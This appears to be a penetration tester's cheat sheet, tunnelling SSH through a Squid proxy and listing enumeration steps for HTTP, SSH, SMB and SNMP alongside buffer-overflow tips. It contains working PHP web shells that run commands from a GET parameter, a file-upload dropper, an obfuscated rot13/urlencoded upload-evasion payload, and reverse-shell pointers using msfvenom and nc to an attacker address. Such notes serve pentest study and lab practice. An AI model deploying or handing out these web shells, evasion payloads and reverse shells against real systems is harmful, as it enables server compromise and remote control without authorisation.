
<b>SSH over HTTP (Squid)</b>

<li> socat </li>

<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999</pre>


<li> proxytunnel </li>

<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555</pre>

<li> proxychains </li>

<pre>http 192.168.1.41 3128

proxychains ssh john@127.0.0.1</pre>

![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png)


<li> corkscrew </li>

<pre>ssh john@192.168.1.41 -t /bin/sh</pre>

![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)



<b>Generic Enumeration</b>

port fullscan

UDP scan



<b> HTTP Enumeration</b>

dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl

banner inspection

review source code

bruteforce with cewl

searchsploit look at versions properly

test all the paths with the exploits, mangle it

nmap --script vuln

nmap --script safe (ssl-cert, virtual hosts)

always incercept with Burp

nikto -h

LFI, RFI, SQL, RCE injections

dirsearch with cookie once authenticated

download vulnerable application from exploit-db and examine it

<b>SSH Enumeration</b>

shellshock

bruteforce

user_enum

test Debian OpenSSL Predictable PRNG

<b>SMB Enumeration</b>

nmap --script vuln

nmap --script smb*

nmap --script smb-enum-shares,smb-ls

enum4linux

<b> BOF exploit-based </b>

change shellcode

make sure all badchars are removed

read the exploit properly in case this makes changes in the shellcode

capture traffic with wireshark making sure the entire shellcode is transmited

run the exploit several times

make sure the JMP ESP matches OS and language

<b> SNMP Enumeration</b>

snmpcheck

snmpenum

<b>PHP RCE</b>

test: 

```<?php phpinfo(); ?>```

simple shell: 

```<?php system($_GET["c"]); ?>```

```<?php `$_GET["c"]`; ?>```

file upload:

```<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>```

file upload evasion:  rot13 + urlencode

```<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>```


<b>RCE via webshell</b>

All pentest monkey reverse shells

msfvenom x86/linux/shell_reverse_tcp -f elf

which wget | nc <ip> <port>


<b>SQLi UNION</b>

search for response on HTML source code
